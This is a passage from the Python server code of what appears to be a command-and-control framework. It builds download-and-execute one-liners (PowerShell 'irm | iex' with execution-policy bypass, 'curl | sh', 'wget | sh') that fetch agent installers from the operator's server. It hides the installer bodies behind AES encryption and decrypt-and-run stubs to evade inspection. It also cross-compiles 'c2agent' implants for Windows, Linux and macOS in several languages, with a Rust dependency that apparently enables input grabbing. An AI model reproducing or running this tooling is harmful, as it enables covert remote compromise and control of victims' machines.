            "c": "gcc + libcurl-dev", "cpp": "g++ + libcurl-dev"}.get(language, "")
    return f"# requires: {note}" if note else ""


# --------------------------------------------------------------------------
# Installer body obfuscation (AES-256-CBC).
# The server encrypts the rendered installer body. The public one-liner stays
# clean; the served file is a small decrypt-and-run stub plus the ciphertext.
# The AES key is NOT embedded in the script: the target fetches it from
# /api/obfkey using the agent token that already rides in the installer.
#   - unix    : openssl enc -d -aes-256-cbc (available everywhere)
#   - windows : .NET [Security.Cryptography.Aes] (built into PowerShell)
# --------------------------------------------------------------------------
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib, hmac as _hmac, base64 as _b64


def _obf_key() -> bytes:
    """AES-256 key (32 bytes). From C2_ENC_KEY env (64 hex), else derived
    deterministically from the agent token (HMAC-SHA256) so a fresh default
    always exists without requiring an env var."""
    enc = os.environ.get("C2_ENC_KEY", "").strip()
    if enc:
        try:
            raw = bytes.fromhex(enc)
            if len(raw) == 32:
                return raw
        except ValueError:
            pass
    seed = (app.state.agent_token or "c2-default-seed").encode()
    return _hmac.new(b"c2-obf-v1", seed, hashlib.sha256).digest()


def _obf_encrypt(plain: str, key: bytes) -> tuple:
    """Encrypt plain text -> (base64 ciphertext, 32-hex IV). CBC + PKCS7."""
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct = cipher.encrypt(pad(plain.encode("utf-8"), AES.block_size))
    return _b64.b64encode(ct).decode("ascii"), iv.hex()


def _obfkey_url(server: str, token: str) -> str:
    return f"{server}/api/obfkey?token={token}"


def _obfuscate_sh(body: str, server: str, token: str) -> str:
    """Wrap a bash installer body so it self-decrypts and runs."""
    key = _obf_key()
    ct_b64, iv_hex = _obf_encrypt(body, key)
    kurl = _obfkey_url(server, token).replace("'", "")
    return (
        "K=$(curl -LsSf '%s')\n"
        "echo '%s' | openssl enc -d -aes-256-cbc -K \"$K\" -iv '%s' -a 2>/dev/null | sh\n"
    ) % (kurl, ct_b64, iv_hex)


def _obfuscate_ps(body: str, server: str, token: str) -> str:
    """Wrap a PowerShell installer body so it self-decrypts and runs."""
    key = _obf_key()
    ct_b64, iv_hex = _obf_encrypt(body, key)
    kurl = _obfkey_url(server, token).replace("'", "")
    return (
        "$ProgressPreference='SilentlyContinue'\n"
        "function h2b([string]$h){$l=$h.Length;$b=New-Object byte[]($l/2);for($i=0;$i -lt $l;$i+=2){$b[$i/2]=[Convert]::ToByte($h.Substring($i,2),16)};,$b}\n"
        "$K=(irm '%s').Trim()\n"
        "$iv=h2b '%s'\n"
        "$ct=[Convert]::FromBase64String('%s')\n"
        "$a=[Security.Cryptography.Aes]::Create()\n"
        "$a.Key=h2b $K;$a.IV=$iv\n"
        "$a.Mode=[System.Security.Cryptography.CipherMode]::CBC\n"
        "$a.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7\n"
        "$dc=$a.CreateDecryptor()\n"
        "$pt=$dc.TransformFinalBlock($ct,0,$ct.Length)\n"
        "iex ([Text.Encoding]::UTF8.GetString($pt))\n"
    ) % (kurl, iv_hex, ct_b64)


def _payload_oneliner(kind: str, install_url: str) -> str:
    """Compact public one-liner, chosen by the Payload dropdown.

    kind:
      "win-irm"    -> powershell -ExecutionPolicy Bypass -c "irm '<url>' | iex"
      "win-iex"    -> powershell -ExecutionPolicy Bypass -c "iex (iwr -UseBasicParsing '<url>').Content"
      "unix-curl"  -> curl -LsSf '<url>' | sh
      "unix-wget"  -> wget -qO- '<url>' | sh
    Note: the URL is always single-quoted inside double-quoted PS strings, so
    there are no nested/escaped double quotes regardless of the URL content.
    """
    url = install_url.replace("'", "")
    if kind == "win-irm":
        return f"powershell -ExecutionPolicy Bypass -c \"irm '{url}' | iex\""
    if kind == "win-iex":
        return f"powershell -ExecutionPolicy Bypass -c \"iex (iwr -UseBasicParsing '{url}').Content\""
    if kind == "unix-wget":
        return f"wget -qO- '{url}' | sh"
    # default: unix-curl
    return f"curl -LsSf '{url}' | sh"


PAYLOAD_KINDS = {
    "win-irm":   {"installer": "windows", "payload": "win-irm"},
    "win-iex":   {"installer": "windows", "payload": "win-iex"},
    "unix-curl": {"installer": "unix",    "payload": "unix-curl"},
    "unix-wget": {"installer": "unix",    "payload": "unix-wget"},
}


def _normalize_payload(value: str) -> tuple:
    """Map a Payload dropdown value -> (installer_shell, payload_kind)."""
    m = PAYLOAD_KINDS.get(value)
    if m:
        return m["installer"], m["payload"]
    # legacy shell_os values still map to sane payloads
    if value in ("linux", "darwin", "bash", "sh", "unix"):
        return "unix", "unix-curl"
    return "windows", "win-irm"


# Rendered installer bodies keyed by (language, server), one dict per shell.
# Served by the clean /agent/{lang}/installer.sh and /agent/{lang}/installer.ps1 routes.
_installer_sh = {}
_installer_ps = {}


@app.get("/download/agent/{language}/installer", include_in_schema=False)
async def download_agent_installer(request: Request, language: str,
                                   token: str = "", server: str = "",
                                   interval: int = 10, jitter: float = 0.0,
                                   verbose: str = ""):
    """Return an installer script (bash or powershell) that boots the agent.
    Config is embedded server-side so the public one-liner stays minimal.
    """
    user = get_current_user(request)
    if not user:
        hdr = request.headers.get("x-agent-token", "")
        tok = token or hdr
        expected = app.state.agent_token
        if not expected or not tok or not secrets.compare_digest(tok, expected):
            raise HTTPException(status_code=401, detail="authentication required")
    if language not in AGENT_FILES:
        raise HTTPException(status_code=404, detail="unknown language")
    base = server.strip().rstrip("/") or str(request.base_url).rstrip("/")
    raw_shell = request.query_params.get("shell_os", "")
    if not raw_shell:
        raw_shell = ("win-irm" if language == "csharp" else
                     "unix" if language in COMPILED_LANGUAGES else "win-irm")
    installer_shell, _ = _normalize_payload(raw_shell)
    if language == "csharp" and installer_shell != "windows":
        raise HTTPException(status_code=400,
            detail="C# agents require .NET -- only Windows payloads/targets are supported")
    body = _build_installer(
        language=language,
        server=base,
        token=token or app.state.agent_token,
        interval=max(1, interval),
        jitter=max(0.0, jitter),
        verbose=verbose in ("1", "true", "on"),
        shell_os=installer_shell,
    )
    prog = "powershell" if installer_shell == "windows" else "bash"
    from fastapi.responses import PlainTextResponse
    return PlainTextResponse(
        body, media_type="text/plain", headers={"X-Installer": prog}
    )


def _serve_installer_script(language: str, server: str, store: dict):
    """Serve a previously generated installer body with a clean URL (no query
    params).

    Only bodies produced by generate_post (which embeds the token the operator
    selected) are served. There is intentionally NO default fallback: building
    one on demand would bake the master agent token into a fully public,
    unauthenticated response, leaking the shared secret to anyone who hits the
    URL. Operators must run Build Agent first.
    """
    from fastapi.responses import PlainTextResponse
    body = store.get((language, server))
    if body is None:
        raise HTTPException(status_code=404, detail="installer not generated")
    return PlainTextResponse(body, media_type="text/plain")


@app.get("/agent/{language}/installer.sh", include_in_schema=False)
async def installer_sh(language: str, request: Request,
                       server: str = ""):
    base = server.strip().rstrip("/") or str(request.base_url).rstrip("/")
    return _serve_installer_script(language, base, _installer_sh)


@app.get("/agent/{language}/installer.ps1", include_in_schema=False)
async def installer_ps1(language: str, request: Request,
                        server: str = ""):
    base = server.strip().rstrip("/") or str(request.base_url).rstrip("/")
    return _serve_installer_script(language, base, _installer_ps)


@app.get("/api/obfkey", include_in_schema=False)
async def api_obfkey(request: Request, token: str = ""):
    """Return the AES key (hex) used to decrypt obfuscated installer bodies.
    Requires the agent token; same gate as the /download/agent endpoints so the
    key is never embedded in any script served to a host lacking the token."""
    user = get_current_user(request)
    if not user:
        hdr = request.headers.get("x-agent-token", "")
        tok = token or hdr
        expected = app.state.agent_token
        if not expected or not tok or not secrets.compare_digest(tok, expected):
            raise HTTPException(status_code=401, detail="authentication required")
    from fastapi.responses import PlainTextResponse
    return PlainTextResponse(_obf_key().hex(), media_type="text/plain")


# --------------------------------------------------------------------------
# Server-side build (compile Go / C# / Rust agents)
# --------------------------------------------------------------------------

BUILD_TARGETS = {
    "linux_x64":   {"os": "linux",   "arch": "amd64",  "ext": "",    "goos": "linux",   "goarch": "amd64",  "rust": "x86_64-unknown-linux-gnu",      "dotnet": "linux-x64",    "cc": "gcc",   "cxx": "g++"},
    "linux_arm64": {"os": "linux",   "arch": "arm64",  "ext": "",    "goos": "linux",   "goarch": "arm64",  "rust": "aarch64-unknown-linux-gnu",     "dotnet": "linux-arm64",  "cc": "aarch64-linux-gnu-gcc", "cxx": "aarch64-linux-gnu-g++"},
    "win_x64":     {"os": "windows", "arch": "amd64",  "ext": ".exe","goos": "windows", "goarch": "amd64",  "rust": "x86_64-pc-windows-gnu",           "dotnet": "win-x64",      "cc": "x86_64-w64-mingw32-gcc", "cxx": "x86_64-w64-mingw32-g++"},
    "win_x86":     {"os": "windows", "arch": "386",    "ext": ".exe","goos": "windows", "goarch": "386",    "rust": "i686-pc-windows-gnu",             "dotnet": "win-x86",      "cc": "i686-w64-mingw32-gcc", "cxx": "i686-w64-mingw32-g++"},
    "darwin_x64":  {"os": "darwin",  "arch": "amd64",  "ext": "",    "goos": "darwin",  "goarch": "amd64",  "rust": "x86_64-apple-darwin",            "dotnet": "osx-x64",      "cc": "o64-clang", "cxx": "o64-clang++"},
    "darwin_arm64":{"os": "darwin",  "arch": "arm64",  "ext": "",    "goos": "darwin",  "goarch": "arm64",  "rust": "aarch64-apple-darwin",           "dotnet": "osx-arm64",    "cc": "oa64-clang", "cxx": "oa64-clang++"},
}


def _norm_ext(ext: str) -> str:
    """Normalize a (possibly dot-less) extension to '.ext' (lowercase)."""
    ext = (ext or "").strip().lower()
    if not ext:
        return ""
    return ext if ext.startswith(".") else "." + ext


def _target_labels(target: str) -> tuple[str, str]:
    """'win_x64' -> ('win', 'x64'); 'linux_arm64' -> ('linux', 'arm64')."""
    parts = (target or "").split("_", 1)
    return (parts[0], parts[1]) if len(parts) == 2 else (parts[0], "")


def _artifact_stem(language: str, target: str) -> str:
    """Base output name: wym_<lang>_<os>_<arch>. Java jars are platform-
    independent so they skip the os/arch segment."""
    if language == "java":
        return "wym_java"
    os_label, arch_label = _target_labels(target)
    return f"wym_{language}_{os_label}_{arch_label}"


def _artifact_name(language: str, target: str, ext: str = "", build_id: str = "") -> str:
    """Uniform output name: wym_<lang>_<os>_<arch>_<build_id><ext>.

    ext is normalized with a leading dot ('exe' -> '.exe'); empty ext = no
    extension (Linux/macOS binaries). build_id is a short source-hash suffix
    that keeps every distinct build a distinct file (java -> wym_java_<id>.jar),
    so the build cache check is simply 'the file exists'."""
    stem = _artifact_stem(language, target)
    if build_id:
        stem = f"{stem}_{build_id}"
    return f"{stem}{_norm_ext(ext)}"

# Serialize server-side builds. Same-target races would corrupt the build cache;
# the lock keeps them strictly sequential WITHOUT freezing the event loop (the
# routes that trigger builds run on a worker thread).
_BUILD_LOCK = threading.Lock()

# Live server-build jobs: job_id -> job state, consumed by the Builder page's
# xterm popup via GET /api/build/log/{job_id}. One actual build runs at a time
# (serialized by _BUILD_LOCK); jobs simply queue up behind it.
_BUILD_JOB_LOCK = threading.Lock()
_BUILD_JOBS: dict[str, dict] = {}
_BUILD_JOB_TTL = 900.0


def _source_hash(language: str) -> str:
    """Hash of the exact source(s) each language build consumes, used for
    cache invalidation so source edits always get rebuilt."""
    h = hashlib.sha256()
    if language == "go":
        for f in sorted(CLIENTS_DIR.glob("*.go")):
            if f.is_file():
                h.update(f.read_bytes())
    else:
        name = {"csharp": "agent.cs", "rust": "agent.rs",
                "c": "agent.c", "cpp": "agent.cpp",
                "java": "agent.java"}[language]
        f = CLIENTS_DIR / name
        if f.is_file():
            h.update(f.read_bytes())
    return h.hexdigest()[:16]


def _dotnet_home_dir() -> str | None:
    """Root of a dotnet-install.sh SDK install (~/.dotnet on Unix), or None.

    The installer places the `dotnet` driver there but only exports PATH for
    its own process (it appends the export to ~/.bashrc), so a server started
    from a fresh shell may not find `dotnet`. Probe the default location so
    server-side C# builds keep working regardless.
    """
    if sys.platform == "win32":
        return None
    root = Path.home() / ".dotnet"
    if (root / "dotnet").is_file() or (root / "bin" / "dotnet").is_file():
        return str(root)
    return None


def _build_env() -> dict:
    """Environment for build subprocesses: if `dotnet` is not already on PATH
    but lives under ~/.dotnet (dotnet-install.sh layout), prepend it and set
    DOTNET_ROOT. Returns the current environ otherwise."""
    env = dict(os.environ)
    if shutil.which("dotnet") is None:
        root = _dotnet_home_dir()
        if root:
            env["PATH"] = root + os.pathsep + env.get("PATH", "")
            env.setdefault("DOTNET_ROOT", root)
    return env


def _detect_dotnet_version() -> str:
    """Pick the highest installed Microsoft.NETCore.App major, e.g. 'net10.0'.
    Fall back to net8.0 if dotnet/runtime detection fails."""
    try:
        r = subprocess.run(["dotnet", "--list-runtimes"],
                           capture_output=True, text=True, timeout=30,
                           env=_build_env())
        majors = sorted({
            int(line.split(" ")[0].split(".")[0])
            for line in r.stdout.splitlines()
            if line.startswith("Microsoft.NETCore.App")
        })
        if majors:
            return f"net{majors[-1]}.0"
    except Exception:
        pass
    return "net8.0"


def _resolve_cc(name: str) -> str | None:
    """Locate a C/C++ compiler. On Windows, also look in common msys2/mingw
    install dirs; fall back to plain gcc/g++ (native mingw builds Windows PE)."""
    extra = []
    if sys.platform == "win32":
        extra = ["C:/msys64/mingw64/bin", "C:/msys64/ucrt64/bin",
                 "C:/msys64/clang64/bin"]
    path = os.pathsep.join(extra + [os.environ.get("PATH", "")])
    found = shutil.which(name, path=path)
    if found:
        return found
    if sys.platform == "win32":
        alt = "gcc" if name.endswith("-gcc") else "g++"
        found = shutil.which(alt, path=path)
        if found:
            return found
    return None


def _bundle_curl_dll(out_path: Path) -> None:
    """Windows mingw builds link libcurl dynamically; copy the DLL beside the
    binary (and any libwinpthread/libgcc DLLs it needs) so it is runnable."""
    bin_dirs = []
    if sys.platform == "win32":
        bin_dirs = ["C:/msys64/mingw64/bin", "C:/msys64/ucrt64/bin",
                    "C:/msys64/clang64/bin"]
    bin_dirs += [d for d in os.environ.get("PATH", "").split(os.pathsep) if d]
    wanted = ["libcurl-4.dll", "libcurl.dll", "libcurl-x64.dll",
              "libwinpthread-1.dll", "libgcc_s_seh-1.dll", "libstdc++-6.dll"]
    for d in bin_dirs:
        for name in wanted:
            src = Path(d) / name
            if src.is_file():
                try:
                    shutil.copy2(src, out_path.parent / name)
                except OSError:
                    pass


def _bundle_gcc_dlls(out_path: Path) -> None:
    """Rust windows-gnu builds link libgcc_s_seh + libwinpthread dynamically;
    copy them beside the binary so it runs without an msys install."""
    bin_dirs = []
    if sys.platform == "win32":
        bin_dirs = ["C:/msys64/mingw64/bin", "C:/msys64/ucrt64/bin"]
    bin_dirs += [d for d in os.environ.get("PATH", "").split(os.pathsep) if d]
    for d in bin_dirs:
        for name in ("libgcc_s_seh-1.dll", "libwinpthread-1.dll"):
            src = Path(d) / name
            if src.is_file():
                try:
                    shutil.copy2(src, out_path.parent / name)
                except OSError:
                    pass


def _run_build_cmd(cmd, cwd=None, env=None, on_line=None, timeout=120):
    """Run one build subprocess, streaming combined stdout+stderr lines through
    on_line() in real time. Returns (returncode, full_output)."""
    try:
        proc = subprocess.Popen(cmd, cwd=str(cwd) if cwd else None, env=env,
                                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                text=True, encoding="utf-8", errors="replace",
                                bufsize=1)
    except OSError as exc:
        return 127, str(exc)
    lines: list[str] = []
    if proc.stdout is not None:
        try:
            for ln in proc.stdout:
                ln = ln.rstrip("\r\n")
                lines.append(ln)
                if on_line:
                    on_line(ln)
        except Exception:
            pass
    try:
        rc = proc.wait(timeout=timeout)
    except subprocess.TimeoutExpired:
        proc.kill()
        proc.wait()
        tail = "[build timed out after %d s]"
        lines.append(tail)
        if on_line:
            on_line(tail)
        return -1, "\n".join(lines)
    return rc, "\n".join(lines)


def _build_binary(language: str, target: str = "", on_line=None) -> tuple[Path | None, str]:
    """Compile an agent for a given target platform. Return (binary_path, error).

    Runs inside a thread lock: a long cross-compile must never run twice for the
    same target concurrently (it would corrupt the shared cache/state), and these
    routes are sync 'def' so a build never blocks the uvicorn event loop.
    on_line() (optional) is called for each line of build output as it streams."""
    with _BUILD_LOCK:
        return _build_binary_locked(language, target, on_line=on_line)


def _build_binary_locked(language: str, target: str = "", on_line=None) -> tuple[Path | None, str]:
    note = (lambda msg: on_line(msg)) if on_line else (lambda msg: None)
    if language not in ("go", "csharp", "rust", "c", "cpp", "java"):
        return None, f"unsupported language: {language}"
    if language == "csharp" and target and not target.startswith("win_"):
        return None, "C# builds only support Windows targets (win_x64, win_x86)"
    if not target:
        target = "win_x64" if sys.platform == "win32" else "linux_x64"
    if target not in BUILD_TARGETS:
        return None, f"unknown target: {target}"
    t = BUILD_TARGETS[target]
    ext = t["ext"]
    # Unique-per-source artifact naming: wym_<lang>_<os>_<arch>_<srcid><ext>
    # (java keeps a platform-neutral stem). The short source-hash suffix makes
    # every distinct source a distinct file, so the cheap cache check collapses
    # to "the file exists". Java jars are cheap to build: they additionally get
    # a timestamp so every server-side build is its own unique artifact.
    build_id = _source_hash(language)[:8]
    if language == "java":
        id_suffix = f"{build_id}_{time.strftime('%Y%m%d-%H%M%S')}"
        out_path = BUILDS_DIR / _artifact_name(language, target, ".jar", id_suffix)
    else:
        id_suffix = build_id
        out_path = BUILDS_DIR / _artifact_name(language, target, ext, build_id)
    hash_path = BUILDS_DIR / f"{_artifact_stem(language, target)}_{id_suffix}.hash"

    if language != "java" and out_path.is_file():
        note(f"[cache hit] reusing {out_path.name}")
        return out_path, ""
    hash_path.unlink(missing_ok=True)

    src = None
    if language != "c" and language != "cpp":
        src = CLIENTS_DIR / {"go": "agent.go", "csharp": "agent.cs",
                             "rust": "agent.rs", "java": "agent.java"}[language]
        if not src.is_file():
            return None, "source not found"

    work = BUILD_WORK_DIR
    if work.exists():
        shutil.rmtree(work, ignore_errors=True)
    work.mkdir(exist_ok=True)
    note(f"compiling {language} for {target} ...")
    try:
        if language == "go":
            # copy ALL Go source files (build tags need them)
            for f in CLIENTS_DIR.glob("*.go"):
                shutil.copy2(f, work / f.name)
            # create go.mod
            (work / "go.mod").write_text("module c2agent\n\ngo 1.21\n", encoding="utf-8")
            env = os.environ.copy()
            env["GOOS"] = t["goos"]
            env["GOARCH"] = t["goarch"]
            env["CGO_ENABLED"] = "0"
            cmd = ["go", "build", "-o", f"agent{ext}"]
            rc, out = _run_build_cmd(cmd, cwd=work, env=env,
                                     on_line=on_line, timeout=120)
            if rc != 0:
                return None, out.strip()
            built = work / f"agent{ext}"
            if not built.is_file():
                return None, "build produced no output"
            shutil.move(str(built), str(out_path))
            hash_path.write_text(_source_hash(language), encoding="utf-8")
            return out_path, ""

        elif language == "csharp":
            shutil.copy2(src, work / "Program.cs")
            # create csproj with runtime identifier; target the newest
            # installed .NET major so the built binary can actually run here
            netver = _detect_dotnet_version()
            (work / "agent.csproj").write_text(f"""<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>{netver}</TargetFramework>
    <RuntimeIdentifier>{t['dotnet']}</RuntimeIdentifier>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
  </PropertyGroup>
</Project>
""", encoding="utf-8")
            rc, out = _run_build_cmd(
                ["dotnet", "publish", "-c", "Release", "-o", "_c2out", "--nologo"],
                cwd=work, env=_build_env(), on_line=on_line, timeout=120
            )
            if rc != 0:
                return None, out.strip()
            # find the binary
            out_dir = work / "_c2out"
            candidates = list(out_dir.glob(f"agent*{ext}")) + list(out_dir.glob(f"*{ext}"))
            if not candidates:
                return None, "build produced no output"
            shutil.move(str(candidates[0]), str(out_path))
            hash_path.write_text(_source_hash(language), encoding="utf-8")
            return out_path, ""

        elif language == "rust":
            cargo_dir = work / "_c2cargo"
            rc, out = _run_build_cmd(
                ["cargo", "init", "--name", "c2agent", str(cargo_dir)],
                on_line=on_line, timeout=30)
            if rc != 0:
                return None, out.strip()
            (cargo_dir / "Cargo.toml").write_text("""[package]
name = "c2agent"
version = "0.1.0"
edition = "2021"

[dependencies]
serde = { version = "1", features = ["derive"] }
serde_json = "1"
reqwest = { version = "0.12", features = ["blocking", "multipart", "json"] }
rdev = { version = "0.5", features = ["unstable_grab"] }
hostname = "0.4"
rand = "0.8"
""", encoding="utf-8")
            shutil.copy2(src, cargo_dir / "src" / "main.rs")
            rust_target = t["rust"]
            env = os.environ.copy()
            if sys.platform == "win32":
                env["PATH"] = os.pathsep.join(
                    ["C:/msys64/mingw64/bin", "C:/msys64/usr/bin",
                     env.get("PATH", "")])
            # reuse one target dir across builds so incremental compile stays warm
            ts_target = BUILD_CARGO_TARGET
            env["CARGO_TARGET_DIR"] = str(ts_target)
            rc, out = _run_build_cmd(
                ["cargo", "build", "--release", "--target", rust_target],
                cwd=cargo_dir, env=env, on_line=on_line, timeout=1800
            )
            if rc != 0 and ("E0463" in out or "may not be installed" in out):
                # requested target's std missing → only fall back to the host
                # toolchain when the requested target IS the host default, so we
                # never serve a binary silently mislabeled as another platform
                host_default = "win_x64" if sys.platform == "win32" else "linux_x64"
                if target != host_default:
                    detail = (out.strip() or
                              f"'cargo build --target {rust_target}' failed")
                    return None, (f"{detail}\n\n[!] Rust std for target '{rust_target}' is not "
                                  f"installed on this server (e.g. 'rustup target add {rust_target}'). "
                                  f"Host fallback is only allowed when target == {host_default}.")
                rust_target = ""
                rc, out = _run_build_cmd(
                    ["cargo", "build", "--release"],
                    cwd=cargo_dir, env=env, on_line=on_line, timeout=1800
                )
            if rc != 0:
                return None, out.strip()
            bin_name = f"c2agent{ext}"
            built = ts_target / rust_target / "release" / bin_name
            if not built.is_file():
                return None, "build produced no output"
            shutil.move(str(built), str(out_path))
            if target.startswith("win_") and (not rust_target or rust_target.endswith("-gnu")):
                _bundle_gcc_dlls(out_path)
            hash_path.write_text(_source_hash(language), encoding="utf-8")
            return out_path, ""

        elif language == "java":
            javac = shutil.which("javac")
            if not javac:
                return None, "java build requires JDK (javac) on the server"
            classes = work / "classes"
            classes.mkdir(exist_ok=True)
            rc, out = _run_build_cmd(
                # --release 11: agent.java uses ProcessHandle (Java 9+), so the
                # classfile floor is 55.0 — runs on any Java 11+ JRE regardless
                # of the (possibly much newer) JDK compiling on the server.
                [javac, "--release", "11", "-encoding", "UTF-8", "-d", str(classes), str(src)],
                on_line=on_line, timeout=120,
            )
            if rc != 0:
                return None, out.strip()
            if not list(classes.glob("*.class")):
                return None, "build produced no output"
            import zipfile
            jar_tmp = work / "agent.jar"
            with zipfile.ZipFile(jar_tmp, "w", zipfile.ZIP_DEFLATED) as z:
                z.writestr("META-INF/MANIFEST.MF",
                           "Manifest-Version: 1.0\r\nMain-Class: Agent\r\n\r\n")
                for f in sorted(classes.rglob("*.class")):
                    z.write(f, f.relative_to(classes).as_posix())
            shutil.move(str(jar_tmp), str(out_path))
            hash_path.write_text(_source_hash(language), encoding="utf-8")
            return out_path, ""

        elif language in ("c", "cpp"):
            src_name = "agent.c" if language == "c" else "agent.cpp"
            compiler = _resolve_cc(t.get("cc") if language == "c" else t.get("cxx"))
            if not compiler:
                need = "x86_64-w64-mingw32-gcc (or mingw gcc) on Windows hosts, or gcc on Linux hosts"
                return None, f"no compiler found for {target}: need {need}"
            src_file = CLIENTS_DIR / src_name
            if not src_file.is_file():
                return None, f"source not found: {src_name}"
            shutil.copy2(src_file, work / src_name)
            cmd = [compiler, "-o", f"agent{ext}", src_name, "-lcurl"]
            if target.startswith("win_"):
                cmd += ["-lws2_32"]
            env = os.environ.copy()
            if sys.platform == "win32":
                env["PATH"] = os.pathsep.join(
                    ["C:/msys64/mingw64/bin", "C:/msys64/usr/bin",
                     env.get("PATH", "")])
            rc, out = _run_build_cmd(cmd, cwd=work, env=env, on_line=on_line, timeout=120)
            if rc != 0:
                return None, out.strip()
            built = work / f"agent{ext}"
            if not built.is_file():
                return None, "build produced no output"
            shutil.move(str(built), str(out_path))
            if target.startswith("win_"):
                _bundle_curl_dll(out_path)
            hash_path.write_text(_source_hash(language), encoding="utf-8")
            return out_path, ""

    except subprocess.TimeoutExpired:
        return None, "build timed out"
    except Exception as e:
        return None, str(e)
    finally:
        shutil.rmtree(work, ignore_errors=True)


def _job_snapshot(job_id: str) -> dict | None:
    with _BUILD_JOB_LOCK:
        job = _BUILD_JOBS.get(job_id)
        if job is None:
            return None
        return {
            "lines": list(job["lines"]),
            "done": job["done"],
            "success": job["success"],
            "message": job["message"],
            "elapsed": round(time.time() - job["started"], 1),
            "language": job["language"],
            "target": job["target"],
        }


def _build_load_history(limit: int = 100) -> list[dict]:
    """Newest-first list of finished builds, loaded from history.json."""
    if not BUILD_HISTORY_FILE.is_file():
        return []
    try:
        rows = json.loads(BUILD_HISTORY_FILE.read_text(encoding="utf-8"))
    except (ValueError, OSError):
        return []
    return list(reversed(rows))[:limit]


def _build_append_history(entry: dict) -> None:
    """Append a finished-build entry to history.json (newest first when read)."""
    with _BUILD_JOB_LOCK:
        try:
            rows = json.loads(BUILD_HISTORY_FILE.read_text(encoding="utf-8"))
        except (ValueError, OSError):
            rows = []
        rows.append(entry)
        rows = rows[-200:]
        try:
            BUILD_HISTORY_FILE.write_text(
                json.dumps(rows, ensure_ascii=False, indent=1),
                encoding="utf-8")
        except OSError:
            pass


def _run_build_job(job_id: str, language: str, target: str) -> None:
    """Worker thread: run one server-side build, appending each output line to
    the job's log (in-memory for the live popup AND a persisted log file for
    error/fix tracking) and recording the finished build in history.json."""
    timestamp = time.strftime("%Y%m%d-%H%M%S")
    logfile = BUILD_LOG_DIR / f"{timestamp}_{job_id}_{language}_{target}.log"
    started = time.time()
    try:
        fh = open(logfile, "a", encoding="utf-8", buffering=1)
    except OSError:
        fh = None

    def log(line: str):
        with _BUILD_JOB_LOCK:
            job = _BUILD_JOBS.get(job_id)
            if job is not None:
                job["lines"].append(line)
        if fh is not None:
            try:
                fh.write(line + "\n")
                fh.flush()
            except OSError:
                pass

    ok, msg = True, ""
    with _BUILD_LOCK:
        try:
            path, err = _build_binary_locked(language, target, on_line=log)
            if err:
                ok, msg = False, err
            else:
                msg = f"built {path.name}" if path is not None else "build ok"
        except Exception as exc:
            ok, msg = False, str(exc)
    log("")
    if ok:
        log(f"[+] build complete: {msg}")
    else:
        log(f"[!] build failed: {msg}")
    if fh is not None:
        try:
            fh.close()
        except OSError:
            pass
    with _BUILD_JOB_LOCK:
        job = _BUILD_JOBS.get(job_id)
        if job is None:
            return
        job["done"] = True
        job["success"] = ok
        job["message"] = msg
        job["logfile"] = logfile.name if fh is not None else ""
    _build_append_history({
        "ts": time.strftime("%Y-%m-%d %H:%M:%S"),
        "job_id": job_id,
        "language": language,
        "target": target,
        "ok": ok,
        "message": msg,
        "elapsed": round(time.time() - started, 1),
        "logfile": logfile.name if fh is not None else "",
    })


class BuildStartIn(BaseModel):
    language: str
    target: str = "win_x64"


@app.post("/api/build/start", include_in_schema=False)
def api_build_start(request: Request, body: BuildStartIn):
    """Start a server-side agent build and stream its log to the Builder page."""
    if not get_current_user(request):
        raise HTTPException(status_code=401, detail="not authenticated")
    language = body.language.strip()
    target = body.target.strip() or "win_x64"
    if language not in ("go", "csharp", "rust", "c", "cpp", "java"):
        raise HTTPException(status_code=400, detail=f"unsupported language: {language}")
    if target not in BUILD_TARGETS:
        raise HTTPException(status_code=400, detail=f"unknown target: {target}")
    if language == "csharp" and not target.startswith("win_"):
        raise HTTPException(status_code=400, detail="C# builds only support Windows targets")
    job_id = secrets.token_hex(8)
    with _BUILD_JOB_LOCK:
        now = time.time()
        for jid in [j for j, jb in _BUILD_JOBS.items()
                    if jb["done"] and now - jb["started"] > _BUILD_JOB_TTL]:
            del _BUILD_JOBS[jid]
        _BUILD_JOBS[job_id] = {"lines": [], "done": False, "success": False,
                               "message": "", "started": now,
                               "language": language, "target": target}
    threading.Thread(target=_run_build_job, args=(job_id, language, target),
                     daemon=True).start()
    return {"job_id": job_id, "language": language, "target": target}


@app.get("/api/build/log/{job_id}", include_in_schema=False)
def api_build_log(request: Request, job_id: str):
    """Poll a running (or finished) server-side build job for its log."""
    if not get_current_user(request):
        raise HTTPException(status_code=401, detail="not authenticated")
    snap = _job_snapshot(job_id)
    if snap is None:
        raise HTTPException(status_code=404, detail="unknown job")
    return snap


@app.post("/api/build/{language}")
def api_build_agent(request: Request, language: str, target: str = "win_x64"):
    """Build an agent binary on the server for a specific target platform."""
    user = get_current_user(request)
    if not user:
        raise HTTPException(status_code=401, detail="not authenticated")
    if language not in ("go", "csharp", "rust", "c", "cpp", "java"):
        raise HTTPException(status_code=400, detail=f"unsupported: {language}")
    path, err = _build_binary(language, target)
    if err:
        raise HTTPException(status_code=500, detail=err)
    return {"path": f"/download/build/{language}?target={target}", "file": path.name}


@app.get("/api/build/history", include_in_schema=False)
def api_build_history(request: Request):
    """Finished builds (from persisted history.json) for the Builder log panel."""
    if not get_current_user(request):
        raise HTTPException(status_code=401, detail="not authenticated")
    return {"builds": _build_load_history()}


@app.get("/api/build/logfile/{job_id}", include_in_schema=False)
def api_build_logfile(request: Request, job_id: str):
    """Raw persisted log of one finished build (error/fix tracking)."""
    if not get_current_user(request):
        raise HTTPException(status_code=401, detail="not authenticated")
    if not re.fullmatch(r"[A-Za-z0-9_-]{1,64}", job_id):
        raise HTTPException(status_code=400, detail="bad job id")
    from fastapi.responses import PlainTextResponse
    for p in BUILD_LOG_DIR.glob(f"*_{job_id}_*.log"):
        return PlainTextResponse(
            p.read_text(encoding="utf-8", errors="replace"),
            media_type="text/plain",
        )
    raise HTTPException(status_code=404, detail="log not found")


@app.delete("/api/build/log", include_in_schema=False)
def api_build_log_clear(request: Request):
    """Delete all persisted build logs + history (Build Log panel cleanup)."""
    if not get_current_user(request):
        raise HTTPException(status_code=401, detail="not authenticated")
    cleared = 0
    with _BUILD_JOB_LOCK:
        for p in BUILD_LOG_DIR.glob("*.log"):
            try:
                p.unlink()
